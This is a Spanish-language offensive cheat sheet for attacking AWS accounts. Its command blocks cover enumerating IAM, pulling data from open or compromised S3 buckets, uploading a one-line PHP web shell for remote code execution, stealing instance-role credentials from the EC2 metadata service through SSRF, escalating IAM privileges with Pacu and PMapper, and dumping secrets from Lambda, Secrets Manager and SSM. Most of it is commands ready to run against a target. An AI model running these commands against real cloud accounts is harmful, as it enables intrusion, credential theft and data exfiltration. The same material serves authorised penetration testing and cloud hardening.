# AWS -- Ataques y Misconfiguraciones

---

## Configuracion inicial

```bash
# Configurar credenciales
aws configure
# AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG...
# Default region: eu-west-1

# Verificar identidad actual
aws sts get-caller-identity
# {AccountId, UserId, Arn}

# Usar perfil especifico
aws --profile objetivo sts get-caller-identity
```

---

## Enumeracion IAM

```bash
# Quienes somos
aws iam get-user
aws sts get-caller-identity

# Listar usuarios
aws iam list-users
aws iam list-groups
aws iam list-roles

# Politicas del usuario actual
aws iam list-attached-user-policies --user-name USUARIO
aws iam list-user-policies --user-name USUARIO

# Ver el contenido de una politica
aws iam get-policy-version --policy-arn ARN --version-id v1

# enumerate-iam -- fuerza bruta de permisos
git clone https://github.com/andresriancho/enumerate-iam
python3 enumerate-iam.py --access-key AKID --secret-key SECRET
```

---

## S3 -- Misconfiguraciones

```bash
# Listar buckets propios
aws s3 ls

# Acceso a bucket publico (sin credenciales)
aws s3 ls s3://nombre-bucket --no-sign-request
aws s3 cp s3://nombre-bucket/archivo.txt . --no-sign-request
aws s3 sync s3://nombre-bucket ./loot --no-sign-request

# Verificar ACL del bucket
aws s3api get-bucket-acl --bucket nombre-bucket

# Verificar politica del bucket
aws s3api get-bucket-policy --bucket nombre-bucket

# Listar objetos con credenciales comprometidas
aws s3 ls --recursive s3://objetivo-prod
aws s3 cp s3://objetivo-prod/backup.sql . 

# Subir archivo (si tenemos PutObject)
echo "<?php system($_GET['cmd']); ?>" > shell.php
aws s3 cp shell.php s3://objetivo-web/shell.php
# Si hay website hosting -> RCE!
```

---

## EC2 Metadata -- SSRF -> RCE

```bash
# Desde SSRF o acceso a la instancia
# 1. Obtener el nombre del rol IAM
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Obtener credenciales temporales del rol
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NOMBRE_ROL
# Devuelve: AccessKeyId, SecretAccessKey, Token (temporales!)

# 3. Usar las credenciales temporales
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 4. Ahora tienes los permisos del rol de la instancia
aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

---

## Escalada de Privilegios IAM

```bash
# Si tienes iam:PassRole + ec2:RunInstances
# -> Lanzar instancia con un rol mas privilegiado

# Si tienes lambda:CreateFunction + iam:PassRole
# -> Crear Lambda con rol de administrador

# Si tienes iam:CreatePolicyVersion
# -> Crear version de politica con AdministratorAccess

# Pacu -- automatizar escalada de privilegios
pacu
> run iam__privesc_scan

# Herramienta: PMapper -- grafo de escalada IAM
pip install principalmapper
pmapper --profile objetivo graph create
pmapper --profile objetivo analysis --privesc
```

---

## Lambda -- Funciones sin proteccion

```bash
# Listar funciones Lambda
aws lambda list-functions

# Ver configuracion (variables de entorno con secretos!)
aws lambda get-function-configuration --function-name NOMBRE

# Invocar funcion
aws lambda invoke --function-name NOMBRE --payload '{}' output.json
cat output.json

# Ver codigo fuente
aws lambda get-function --function-name NOMBRE --query 'Code.Location'
# Descargar el ZIP con el codigo
```

---

## Secrets Manager y SSM Parameter Store

```bash
# Listar secretos
aws secretsmanager list-secrets

# Leer un secreto
aws secretsmanager get-secret-value --secret-id NOMBRE_SECRETO

# SSM Parameter Store (credenciales de BD, API keys...)
aws ssm describe-parameters
aws ssm get-parameter --name NOMBRE --with-decryption
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```
